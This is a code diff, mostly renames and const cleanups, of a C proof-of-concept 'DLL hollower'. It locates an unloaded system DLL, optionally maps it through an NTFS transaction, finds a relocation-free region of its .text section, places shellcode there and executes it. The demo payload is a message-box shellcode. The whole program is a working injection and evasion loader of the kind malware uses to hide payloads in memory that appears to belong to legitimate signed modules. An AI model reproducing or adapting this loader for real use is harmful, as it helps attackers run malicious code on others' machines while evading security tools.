@@ -13,58 +13,58 @@ typedef LONG(__stdcall* NtCreateSection_t)(HANDLE*, ULONG, void*, LARGE_INTEGER*
 typedef LONG(__stdcall* NtMapViewOfSection_t)(HANDLE, HANDLE, PVOID*, ULONG_PTR, SIZE_T, PLARGE_INTEGER, PSIZE_T, DWORD, ULONG, ULONG);
 typedef NTSTATUS(__stdcall* NtCreateTransaction_t)(PHANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, LPGUID, HANDLE, ULONG, ULONG, ULONG, PLARGE_INTEGER, PUNICODE_STRING);
 
-BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA);
+BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwStartRVA, uint32_t dwEndRVA);
 PVOID GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEADER* pInitialSectHdrs, uint64_t qwRVA);
 
 //
 // Hollower logic
 //
 
-BOOL HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, uint32_t dwReqBufSize, uint8_t** ppMappedCode, BOOL bTxF) {
-	NtCreateSection_t NtCreateSection;
-	NtMapViewOfSection_t NtMapViewOfSection;
-	NtCreateTransaction_t NtCreateTransaction;
+BOOL HollowDll(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCodeBuf, uint32_t dwReqBufSize, uint8_t** ppMappedCode, BOOL bTxF) {
+	NtCreateSection_t ntCreateSection;
+	NtMapViewOfSection_t ntMapViewOfSection;
+	NtCreateTransaction_t ntCreateTransaction;
 
-	WIN32_FIND_DATAW Wfd = { 0 };
-	wchar_t SearchFilePath[MAX_PATH] = { 0 };
+	WIN32_FIND_DATAW wfd = { 0 };
+	wchar_t searchFilePath[MAX_PATH] = { 0 };
 	HANDLE hFind;
 	BOOL bMapped = FALSE;
 
 	const HMODULE hNtdll = LoadLibraryW(L"ntdll.dll");
 
-	NtCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
-	NtMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
-	NtCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");
+	ntCreateSection = (NtCreateSection_t)GetProcAddress(hNtdll, "NtCreateSection");
+	ntMapViewOfSection = (NtMapViewOfSection_t)GetProcAddress(hNtdll, "NtMapViewOfSection");
+	ntCreateTransaction = (NtCreateTransaction_t)GetProcAddress(hNtdll, "NtCreateTransaction");
 
 	//
 	// Locate a DLL in the architecture appropriate system folder which has a sufficient image size to hollow for allocation.
 	//
 
-	GetSystemDirectoryW(SearchFilePath, MAX_PATH);
-	wcscat_s(SearchFilePath, MAX_PATH, L"\\*.dll");
+	GetSystemDirectoryW(searchFilePath, MAX_PATH);
+	wcscat_s(searchFilePath, MAX_PATH, L"\\*.dll");
 
-	if ((hFind = FindFirstFileW(SearchFilePath, &Wfd)) != INVALID_HANDLE_VALUE) {
+	if ((hFind = FindFirstFileW(searchFilePath, &wfd)) != INVALID_HANDLE_VALUE) {
 		do {
-			if (GetModuleHandleW(Wfd.cFileName) == NULL) {
+			if (GetModuleHandleW(wfd.cFileName) == NULL) {
 				HANDLE hFile = INVALID_HANDLE_VALUE, hTransaction = INVALID_HANDLE_VALUE;
 				wchar_t filePath[MAX_PATH];
 				NTSTATUS ntStatus;
-				uint8_t* pFileBuf = NULL;
+				uint8_t* pFileBuf;
 
 				GetSystemDirectoryW(filePath, MAX_PATH);
 				wcscat_s(filePath, MAX_PATH, L"\\");
-				wcscat_s(filePath, MAX_PATH, Wfd.cFileName);
+				wcscat_s(filePath, MAX_PATH, wfd.cFileName);
 
 				//
 				// Read the DLL to memory and check its headers to identify its image size.
 				//
 
 				if (bTxF) {
-					OBJECT_ATTRIBUTES ObjAttr = { sizeof(OBJECT_ATTRIBUTES) };
+					OBJECT_ATTRIBUTES objAttr = { sizeof(OBJECT_ATTRIBUTES) };
 
-					ntStatus = NtCreateTransaction(&hTransaction,
+					ntStatus = ntCreateTransaction(&hTransaction,
 						TRANSACTION_ALL_ACCESS,
-						&ObjAttr,
+						&objAttr,
 						NULL,
 						NULL,
 						0,
@@ -112,7 +112,7 @@ BOOL HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 								// Found a DLL with sufficient image size: map an image view of it for hollowing.
 								//
 
-								printf("* %ws - image size: %lu - .text size: %lu\r\n", Wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);
+								printf("* %ws - image size: %lu - .text size: %lu\r\n", wfd.cFileName, pNtHdrs->OptionalHeader.SizeOfImage, pSectHdrs->Misc.VirtualSize);
 
 								BOOL bTxF_Valid = FALSE;
 								uint32_t dwCodeRva = 0;
@@ -144,7 +144,7 @@ BOOL HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 
 									if (pRelocBuf != NULL) {
 										for (dwCodeRva = 0; !bRangeFound && dwCodeRva < pSectHdrs->Misc.VirtualSize; dwCodeRva += dwReqBufSize) {
-											if (!CheckRelocRange(pRelocBuf, pNtHdrs->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
+											if (!CheckRelocRange(pRelocBuf, pSectHdrs->VirtualAddress + dwCodeRva, pSectHdrs->VirtualAddress + dwCodeRva + dwReqBufSize)) {
 												bRangeFound = TRUE;
 												break;
 											}
@@ -171,15 +171,15 @@ BOOL HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 
 								if (!bTxF || bTxF_Valid) {
 									HANDLE hSection = NULL;
-									ntStatus = NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
+									ntStatus = ntCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_READONLY, SEC_IMAGE, hFile);
 
 									if (NT_SUCCESS(ntStatus)) {
 										*pqwMapBufSize = 0; // The map view is an in and out parameter, if it isn't zero the map may have its size overwritten
-										ntStatus = NtMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, NULL, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
+										ntStatus = ntMapViewOfSection(hSection, GetCurrentProcess(), (void**)ppMapBuf, 0, 0, NULL, (PSIZE_T)pqwMapBufSize, 1, 0, PAGE_READONLY); // AllocationType of MEM_COMMIT|MEM_RESERVE is not needed for SEC_IMAGE.
 
 										if (NT_SUCCESS(ntStatus)) {
 											if (*pqwMapBufSize >= pNtHdrs->OptionalHeader.SizeOfImage) { // Verify that the mapped size is of sufficient size. There are quirks to image mapping that can result in the image size not matching the mapped size.
-												printf("* %ws - mapped size: %I64u\r\n", Wfd.cFileName, *pqwMapBufSize);
+												printf("* %ws - mapped size: %I64u\r\n", wfd.cFileName, *pqwMapBufSize);
 												*ppMappedCode = *ppMapBuf + pSectHdrs->VirtualAddress + dwCodeRva;
 
 												if (!bTxF) {
@@ -229,7 +229,7 @@ BOOL HollowDLL(uint8_t** ppMapBuf, uint64_t* pqwMapBufSize, const uint8_t* pCode
 					printf("- Failed to open handle to %ws (error %lu)\r\n", filePath, GetLastError());
 				}
 			}
-		} while (!bMapped && FindNextFileW(hFind, &Wfd));
+		} while (!bMapped && FindNextFileW(hFind, &wfd));
 
 		FindClose(hFind);
 	}
@@ -267,7 +267,7 @@ PVOID GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEA
 	IMAGE_SECTION_HEADER* pContainSectHdr;
 
 	if ((pContainSectHdr = GetContainerSectHdr(pNtHdrs, pInitialSectHdrs, qwRVA)) != NULL) {
-		uint32_t dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);
+		const uint32_t dwOffset = (qwRVA - pContainSectHdr->VirtualAddress);
 
 		if (dwOffset < pContainSectHdr->SizeOfRawData)
 		{
@@ -279,13 +279,13 @@ PVOID GetPAFromRVA(uint8_t* pPeBuf, IMAGE_NT_HEADERS* pNtHdrs, IMAGE_SECTION_HEA
 	return NULL;
 }
 
-BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwStartRVA, uint32_t dwEndRVA) {
+BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwStartRVA, uint32_t dwEndRVA) {
 	IMAGE_BASE_RELOCATION* pCurrentRelocBlock;
 	uint32_t dwRelocBufOffset, dwX;
 	BOOL bWithinRange = FALSE;
 
 	for (pCurrentRelocBlock = (IMAGE_BASE_RELOCATION*)pRelocBuf, dwX = 0, dwRelocBufOffset = 0; pCurrentRelocBlock->SizeOfBlock; dwX++) {
-		uint32_t dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
+		const uint32_t dwNumBlocks = ((pCurrentRelocBlock->SizeOfBlock - sizeof(IMAGE_BASE_RELOCATION)) / sizeof(uint16_t));
 		uint16_t* pwCurrentRelocEntry = (uint16_t*)((uint8_t*)pCurrentRelocBlock + sizeof(IMAGE_BASE_RELOCATION));
 
 		for (uint32_t dwY = 0; dwY < dwNumBlocks; dwY++, pwCurrentRelocEntry++) {
@@ -295,7 +295,7 @@ BOOL CheckRelocRange(uint8_t* pRelocBuf, uint32_t dwRelocBufSize, uint32_t dwSta
 #define RELOC_FLAG_ARCH_AGNOSTIC IMAGE_REL_BASED_HIGHLOW
 #endif
 			if (((*pwCurrentRelocEntry >> 12) & RELOC_FLAG_ARCH_AGNOSTIC) == RELOC_FLAG_ARCH_AGNOSTIC) {
-				uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));
+				const uint32_t dwRelocEntryRefLocRva = (pCurrentRelocBlock->VirtualAddress + (*pwCurrentRelocEntry & 0x0FFF));
 
 				if (dwRelocEntryRefLocRva >= dwStartRVA && dwRelocEntryRefLocRva < dwEndRVA) {
 					bWithinRange = TRUE;
@@ -322,7 +322,7 @@ INT main() {
 	uint8_t* pMapBuf = NULL, * pMappedCode = NULL;
 	uint64_t qwMapBufSize;
 	
-	if (HollowDLL(&pMapBuf, &qwMapBufSize, bMessageboxShellcode64, sizeof bMessageboxShellcode64, &pMappedCode, TRUE)) {
+	if (HollowDll(&pMapBuf, &qwMapBufSize, bMessageboxShellcode64, sizeof bMessageboxShellcode64, &pMappedCode, TRUE)) {
 		printf("+ Successfully mapped an image to hollow at 0x%p (size: %I64u bytes)\r\n", (const PCHAR)pMapBuf, qwMapBufSize);
 		printf("* Calling 0x%p...\r\n", (const PCHAR)pMappedCode);
 		((fnAddr)pMappedCode)();
